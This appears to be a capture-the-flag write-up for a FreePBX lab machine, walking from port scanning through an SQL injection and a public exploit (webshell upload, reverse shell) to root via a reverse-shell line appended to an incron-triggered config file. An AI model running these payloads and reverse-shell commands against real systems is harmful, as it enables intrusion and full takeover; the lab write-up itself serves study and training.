## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Season - 11 Machine 
Reactor  - Easy   - Linux
```
## IP-Address
```bash
10.129.106.90
```
## Set MTU
```bash
$sudo ip link set dev tun0 mtu 1200
```
## Enumeration
- RustScan
```bash
PORT    STATE SERVICE   REASON         VERSION
22/tcp  open  ssh       syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCZBL8VwwAo5nMO8NKi+tOD98pIamOTde7sVlAJmP1Lp5urgs8hzvYIVElaEWZdxjHZM5hggtGg8Tmqzn2tOeNsN3rh/JTcXCjtc2izUuwLb18s5GgMHkBooT6UBCdcztPySFILnedHcFusfxSPTVTSIrwGaxLKULJ/qn2ClQ6BBp60NqQg0Da93fbm/5NS6OtZYdWdfcW4oyN/LWQcfFo/OYFjzWng+1pU+gfeuWic4iW2eg9qmWq43Och4oNJ3VAYh8MpXaKuoaDi+J7R6f60ADTQ6Kg/oSHKj8RV0zySax8qHt+Q2987wcdXuCnI+6oREQIUHu1s3z+rmnT2k4Mx
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH4ZlpWhdGD2bgi63EUvvzRx/sv8EvmVBLOFPVarhdPQcqCL69SyCtU0JLlNqdLxKGUbh5t1/9BvGU7+cXZdt1E=
|   256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5pB+WpL08kZ9YCgPA7QRnKjCsHY/R9oNeUQF1LD5Ms
80/tcp  open  http      syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
| http-title: 404 Not Found
|_Requested resource was config.php
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/https syn-ack ttl 63 Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-robots.txt: 1 disallowed entry
|_/
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@pbxconnect/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@pbxconnect/localityName=SomeCity/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-30T14:07:27
| Not valid after:  2026-11-30T14:07:27
| MD5:     2530 86e8 e962 6d48 36f8 e524 bf79 cc5a
| SHA-1:   6997 e786 d78e 2d0a dcb4 f449 7f65 ba12 52ef 0466
| SHA-256: 46b9 6671 74f5 9939 af02 a812 993c a389 bf84 c67a de5e 94b1 6c01 43d3 fac9 b666
| -----BEGIN CERTIFICATE-----
| MIID4jCCAsqgAwIBAgICAOgwDQYJKoZIhvcNAQELBQAwgaUxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MRMwEQYDVQQDDApwYnhjb25uZWN0MR4wHAYJKoZIhvcNAQkBFg9yb290QHBi
| eGNvbm5lY3QwHhcNMjUxMTMwMTQwNzI3WhcNMjYxMTMwMTQwNzI3WjCBpTELMAkG
| A1UEBhMCLS0xEjAQBgNVBAgMCVNvbWVTdGF0ZTERMA8GA1UEBwwIU29tZUNpdHkx
| GTAXBgNVBAoMEFNvbWVPcmdhbml6YXRpb24xHzAdBgNVBAsMFlNvbWVPcmdhbml6
| YXRpb25hbFVuaXQxEzARBgNVBAMMCnBieGNvbm5lY3QxHjAcBgkqhkiG9w0BCQEW
| D3Jvb3RAcGJ4Y29ubmVjdDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ALHeypjH6abbs3T5INa8PZP8w90Xjj0PJ68myliRayEhZKmQL/FbL+9XLIaRGxMI
| 3fXLvn0Sw2AfDWWpkFEMckSokGZK2MTp4CYooo4DvNIiggms4xZ2aLY35zsU45II
| EzVB6OAtd8imI6h/D/YEaOvFQFPtXb9gzB0edJP55gjkCIYAt95oLAZLbUa5u0r9
| OhjBPuqVQE0f6oqsZh/1UnZcsscDw51r7jKGx2+uSpVb6dxMM9y2XX/XC26g4VbA
| noHrbagpbisbDwGIhQU19znUT2iYVpNBV3I9ehiVB7FFC7+cT8LIgpJ+KtXM/cjg
| dsxJ+sVzuB02MCS6ly0PbjMCAwEAAaMaMBgwCQYDVR0TBAIwADALBgNVHQ8EBAMC
| BeAwDQYJKoZIhvcNAQELBQADggEBAHdARF+ZdnUhYCaB5lowDM1sxWS9F8kkECOh
| 3D/d/LeJ7c6RRR0Ktmw6/4zRCW1bDUkjtdz4idYRYGyivkYobhX3NvhV5ghslMw3
| UDjGexJToW7Qk5YNSIeKkfR89Tg2DkJzlUs4b1DT+ZaGgCto7x8mrzXcT0ktDyK1
| nHqmiKXuVFtwLpnJxXArPkhiH7TYgGaeUZw8U6z7EUBtgnn8BESAB+LQ2n4OQnbE
| lJS2230sbxaxiOpt83EN97CnusGePjqpiUXxPJVc0LA5U7mZiqhojAFWRSOMax7l
| yzYI6PipGEKHexXmy4DTfm/n0xR4HRITygOgW28l6qiXtAME9hw=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
| http-title: 400 Bad Request
|_Requested resource was /admin
```
---
#### Web Enumeration
- Port 80
```bash
POST /admin/ajax.php?module=endpoint&command=upload_cust_fw HTTP/1.1
Host: connected.htb
Content-Length: 56
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Origin: http://connected.htb
Referer: http://connected.htb/admin/config.php
Accept-Encoding: gzip, deflate, br
Cookie: lang=en_US; PHPSESSID=vr880m7dcntlui74mka0girfh9
Connection: keep-alive

username=admin'--&password=aGVsbG8%253D&loginpanel=admin
```
- Key Notes
```Note
- ajax.php vulnerability 
  - Confirm SQLi using module endpoint
- using sqli module added user to mysql admin
  clain revshell
```
- #CVE-2025-57819
----
### Exploit
- Named by its CVE and uploaded on Github  
```bash
$ python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.52 --lport 4444

██████╗ ██╗ ██╗ ██████╗ ██╗ ██╗██╗ ██╗ ██╗██╗ ██╗  
██╔════╝ ██║ ██║██╔═══██╗██║ ██║██║ ██║ ██║██║ ██║  
██║ ███╗███████║██║ ██║██║ ██║██║ ███████║███████║  
██║ ██║██╔══██║██║ ██║██║ ██║██║ ██╔══██║██╔══██║  
╚██████╔╝██║ ██║╚██████╔╝╚██████╔╝███████╗██║ ██║██║ ██║  
╚═════╝ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝ ╚═╝╚═╝ ╚═╝

    Gh0ulH4x Research Framework
  Security Research • CTF • Lab Automation

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: gh0ulh4x

[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_o8kwo:[password omitted]
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_o8kwo
[*] [CVE-2025-61678] uploading webshell -> /7ghufqioiz/q097htvq.php
[+] webshell live: http://connected.htb/7ghufqioiz/q097htvq.php
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.129.106.236 on port 44790
[*] firing reverse shell -> 10.10.14.52:4444
[+] shell incoming! dropping to interactive
[*] Switching to interactive mode
bash: no job control in this shell
$ whoami
asterisk
$ id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```
--- 
###  User Enumeration
```bash

$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
asterisk:x:999:1000::/home/asterisk:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:998:998:User for polkitd:/:/sbin/nologin
libstoragemgmt:x:997:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
openvpn:x:996:996:OpenVPN:/etc/openvpn:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
unbound:x:995:995:Unbound DNS resolver:/etc/unbound:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin
mysql:x:27:27:MariaDB Server:/var/lib/mysql:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
mongodb:x:184:992:MongoDB Database Server:/var/lib/mongodb:/sbin/nologin
chrony:x:994:991::/var/lib/chrony:/sbin/nologin
redis:x:993:990:Redis Database Server:/var/lib/redis:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
radiusd:x:95:95:radiusd user:/var/lib/radiusd:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
_laurel:x:992:988::/var/log/laurel:/bin/false

$ cd /home
$ cd asterisk
$ ls
user.txt
$ cat user.txt
[flag omitted]
```
- Uploading `lse.sh`
```bash
- after upload & running lse.sh 
  - Found - unexpected binary 
```
- Let's' list system binary
```bash
find / -perm -4000 -type f 2>/dev/null
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/incrontab
/usr/bin/at
/usr/bin/staprun
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
/usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
```
- Found `/usr/bin/incrontab` 
- Let's Enumerate More
```bash
 $ /usr/bin/incrontab --version
incrontab 0.5.10

$ /usr/bin/incrontab --help
incrontab - inotify cron table manipulator
(c) Lukas Jelinek, 2006, 2007, 208

usage: incrontab [<options>] <operation>
       incrontab [<options>] <FILE-TO-IMPORT>

<operation> may be one of the following:
  -?, --about                  gives short information about program
  -h, --help                   prints this help text
  -l, --list                   lists user table
  -r, --remove                 removes user table
  -e, --edit                   provides editing user table
  -t, --types                  list supported event types
  -d, --reload                 request incrond to reload user table
  -V, --version                prints program version


These options may be used:
  -u <USER>, --user=<USER>     overrides current user (requires root privileges)
  -f <FILE>, --config=<FILE>   overrides default configuration file  (requires root privileges)
```
- System Services
```bash
ps aux | grep incron
root        748  0.0  0.0  15044  2856 ?        Ss   17:23   0:00 /usr/sbin/incrond
asterisk  37450  0.0  0.0   9104   920 ?        S    21:11   0:00 grep --color=auto incron

ls -la /etc/incron.d/
total 24
drwxr-xr-x.   2 root root   49 Nov 30  2025 .
drwxr-xr-x. 119 root root 8192 Jun 16 17:23 ..
-rwxr-xr-x.   1 root root  619 Apr 15  2021 legacy
-rwxr-xr-x.   1 root root   80 Apr 15  2021 local
-rwxr-xr-x.   1 root root   91 Apr 15  2021 sysadmin
```
- `Incron` schedule 
```bash
cat /etc/incron.d/legacy
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha

$ cat /etc/incron.d/local
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

$ cat /etc/incron.d/sysadmin
/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#

[asterisk@connected asterisk]$ $ ls -la /etc/incron.d/*
ls -la /etc/incron.d/*
-rwxr-xr-x. 1 root root 619 Apr 15  2021 /etc/incron.d/legacy
-rwxr-xr-x. 1 root root  80 Apr 15  2021 /etc/incron.d/local
-rwxr-xr-x. 1 root root  91 Apr 15  2021 /etc/incron.d/sysadmin
```
- Investigate Each path one-by-one
```bash
- Paths are 
  - /usr/sbin/sysadmin_update_set_cron
  - /usr/sbin/sysadmin_wanrouter_restart
  - /usr/sbin/sysadmin_portmgmt
  - /usr/sbin/sysadmin_dahdi_restart
  - /usr/sbin/sysadmin_ha
```
- Others Paths leads to nowhere except 
```bash
$ $ ls -la /usr/sbin/sysadmin_dahdi_restart
ls -la /usr/sbin/sysadmin_dahdi_restart
-rwxr-xr-x. 1 root root 157 Apr 15  2021 /usr/sbin/sysadmin_dahdi_restart
[asterisk@connected etc]$ $ cat /usr/sbin/sysadmin_dahdi_restart
cat /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh
/etc/init.d/asterisk stop
sleep 5
/etc/init.d/dahdi restart
sleep 5
export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```
- Another path reveals - `/etc/init.d/dahdi` & `/etc/init.d/asterisk`
- inside the `dahdi` Got Interesting comment 
```bash
# Don't edit the following values. Edit /etc/dahdi/init.conf instead.
```
- Permission of `/etc/dahdi/init.conf`
```bash
ls -la /etc/dahdi/init.conf
-rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf
[asterisk@connected etc]$ $ cat /etc/dahdi/init.conf
cat /etc/dahdi/init.conf
#
# Shell settings for Dahdi initialization scripts.
# This replaces the old/per-platform files (/etc/sysconfig/zaptel,
# /etc/defaults/zaptel)
#

# The maximal timeout (seconds) to wait for udevd to finish generating
# device nodes after the modules have loaded and before running dahdi_cfg.
#DAHDI_DEV_TIMEOUT=40

# A list of modules to unload when stopping.
# All of their dependencies will be unloaded as well.
#DAHDI_UNLOAD_MODULES=""		# Disable module unloading
#DAHDI_UNLOAD_MODULES="dahdi echo"	# If you use OSLEC

# Override settings for xpp_fxloader
#XPP_FIRMWARE_DIR=/usr/share/dahdi
#XPP_HOTPLUG_DISABLED=yes
#XPP_HOTPLUG_DAHDI=yes
#ASTERISK_SUPPORTS_DAHDI_HOTPLUG=yes

# Disable udev handling:
#DAHDI_UDEV_DISABLE_DEVICES=yes
#DAHDI_UDEV_DISABLE_SPANS=yes
```
---
#### Privilege escalation
- Steps 
```bash
# Step 1: Append reverse shell to the sourced config file 
echo 'bash -i >& /dev/tcp/10.10.14.52/4446 0>&1' >> /etc/dahdi/init.conf 

# Step 2: Verify it's there 
tail -3 /etc/dahdi/init.conf 

# Step 3: Trigger the incron rule by touching the spool file 
touch /var/spool/asterisk/sysadmin/dahdi_restart
```
- Practical 
```bash
$ echo 'bash -i >& /dev/tcp/10.10.14.52/4446 0>&1' >> /etc/dahdi/init.conf

$ tail -3 /etc/dahdi/init.conf
#DAHDI_UDEV_DISABLE_DEVICES=yes
#DAHDI_UDEV_DISABLE_SPANS=yes
bash -i >& /dev/tcp/10.10.14.52/4446 0>&1

$ touch /var/spool/asterisk/sysadmin/dahdi_restart
touch /var/spool/asterisk/sysadmin/dahdi_restart
```
----
#### Reverse shell
```bash
[root@connected /]# whoami
whoami
root
[root@connected /]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@connected /]# cd /root/
cd /root/
[root@connected root]# cat root.txt
cat root.txt
[flag omitted]
```
# END